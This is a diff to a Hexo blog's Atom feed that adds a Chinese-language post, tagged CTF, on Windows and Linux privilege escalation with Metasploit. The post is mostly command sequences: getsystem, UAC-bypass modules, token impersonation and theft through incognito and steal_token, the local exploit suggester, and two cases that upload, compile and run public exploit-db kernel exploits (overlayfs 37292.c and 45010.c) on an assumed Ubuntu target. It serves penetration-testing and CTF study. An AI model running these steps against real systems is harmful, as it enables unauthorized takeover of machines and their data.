@@ -6,7 +6,7 @@
   <link href="https://jielunya.github.io/atom.xml" rel="self"/>
   
   <link href="https://jielunya.github.io/"/>
-  <updated>2022-12-24T12:10:16.218Z</updated>
+  <updated>2022-12-24T15:33:37.872Z</updated>
   <id>https://jielunya.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用MSF进行系统提权</title>
+    <link href="https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
+    <id>https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</id>
+    <published>2022-12-24T13:09:38.000Z</published>
+    <updated>2022-12-24T15:33:37.872Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="直接输入提升权限命令"><a href="#直接输入提升权限命令" class="headerlink" title="直接输入提升权限命令"></a>直接输入提升权限命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;getsystem</span><br></pre></td></tr></table></figure><h2 id="使用MSF内置BYPASSUAC提权"><a href="#使用MSF内置BYPASSUAC提权" class="headerlink" title="使用MSF内置BYPASSUAC提权"></a>使用MSF内置BYPASSUAC提权</h2><blockquote>MSF内置有多个bypassuac模块，原理有所不同，使用方法类似，运行后返回一个新会话后再次执行getsystem获取系统权限。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;search bypassuac</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><h2 id="使用MSF的enum-patches模块"><a href="#使用MSF的enum-patches模块" class="headerlink" title="使用MSF的enum_patches模块"></a>使用MSF的enum_patches模块</h2><blockquote>使用MSF的enum_patches模块，收集补丁信息，然后查找可用exploits进行提权</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><blockquote>自行根据不同的补丁所存在的漏洞使用msf存在的脚本进行权限提升</blockquote><h2 id="令牌操作-INCOGNITO假冒令牌"><a href="#令牌操作-INCOGNITO假冒令牌" class="headerlink" title="令牌操作 INCOGNITO假冒令牌"></a>令牌操作 INCOGNITO假冒令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;use incognito   #加载incognito模块</span><br><span class="line"></span><br><span class="line">meterpreter&gt;list_tokens -u  #查看可用的token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;impersonate_token &#x27;PIG\testpig&#x27; #此处假设PIG\testpig为可用token</span><br><span class="line"></span><br><span class="line">execute -f cmd.exe -i -t      #  -t 使用假冒的token执行cmd.exe，亦可以直接输入shell进入当前token的终端</span><br><span class="line"></span><br><span class="line">rev2self  #返回原始token</span><br></pre></td></tr></table></figure><h2 id="STEAL-TOKEN窃取令牌"><a href="#STEAL-TOKEN窃取令牌" class="headerlink" title="STEAL_TOKEN窃取令牌"></a>STEAL_TOKEN窃取令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps #先ps列出进程详细信息</span><br><span class="line"></span><br><span class="line">meterpreter&gt;steal_token &lt;pid值&gt; #从指定进程中窃取token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;rev2self #返回原始token</span><br></pre></td></tr></table></figure><h2 id="利用metaspolit的内置模块Local-Exploit-Suggester"><a href="#利用metaspolit的内置模块Local-Exploit-Suggester" class="headerlink" title="利用metaspolit的内置模块Local Exploit Suggester"></a>利用metaspolit的内置模块Local Exploit Suggester</h2><blockquote>这个模块可以帮助我们识别系统存在哪些漏洞可以被利用，在拿到meterpreter会话的前提下，通过扫描，然后列出提供最合适的exp，通过合适的exp我们可以进一步提权。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set LHOST &lt;ip地址&gt;</span><br><span class="line"></span><br><span class="line">set SESSION 1 #会话id</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="使用Ubuntu本地提权漏洞"><a href="#使用Ubuntu本地提权漏洞" class="headerlink" title="使用Ubuntu本地提权漏洞"></a>使用Ubuntu本地提权漏洞</h2><p>案例1:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先使用命令lsb_release -a查看系统发行的版本。</span><br><span class="line">同时使用命令uname -a查看内核版本信息</span><br></pre></td></tr></table></figure><blockquote>此处假设目标靶机的操作系统是Ubuntu 14.04.4 LTS，内核版本为3.13.0-45-generic</blockquote></blockquote>第一种方法：使用常规的溢出漏洞overlayfs，支持ubuntu 12.04/14.04/14.10/15.04和内核版本大于3.13.0小于3.19。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit overlayfs ubuntu local #搜索中关键字overlayfs的ubuntu本地提权利用漏洞的源码</span><br><span class="line">复制/usr/share/exploitdb/exploits/linux/local/37292.c至/root目录 #此处假设源码为37292.c</span><br><span class="line">进入Meterpreter命令行，使用命令upload 37292.c将该exp上传至靶机</span><br><span class="line">最后使用命令shell打开靶机的终端</span><br><span class="line">使用命令gcc -o overlayfs 37292.c #编译exp（-o参数为命名）</span><br><span class="line">然后使用命令chmod 777 overlayfs 给exp进行赋权</span><br><span class="line">最后使用命令./overlayfs进行提权，最终获得靶机最高权限，</span><br></pre></td></tr></table></figure><p>案例2:</p><blockquote>此处假设目标靶机的操作系统是Ubuntu 16.04 LTS，内核版本为4.10.0-22-generic</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;searchsploit Ubuntu 16.04 #此处找到一个合适的漏洞为45010</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line"></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./    #把利用源码拷贝到当前目录</span><br><span class="line"></span><br><span class="line">gcc 45010.c -o 45010   #编译（-o参数为命名）</span><br><span class="line"></span><br><span class="line">meterpreter&gt;upload /root/45010 /tmp/45010 #(放到tem目录是因为tem目录一般都有权限)</span><br><span class="line"></span><br><span class="line">meterpreter&gt;shell</span><br><span class="line"></span><br><span class="line">cd /tem</span><br><span class="line"></span><br><span class="line">chmod +x 45010</span><br><span class="line"></span><br><span class="line">./45010</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;直接输入提升权限命令&quot;&gt;&lt;a href=&quot;#直接输入提升权限命令&quot; class=&quot;headerlink&quot; title=&quot;直接输入提升权限命令&quot;&gt;&lt;/a&gt;直接输入提升权限命令&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
+      
+    
+    
+    
+    
+    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
+    
+    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
+    
+  </entry>
   
   <entry>
     <title>MSFのreverse_tcp反向连接</title>
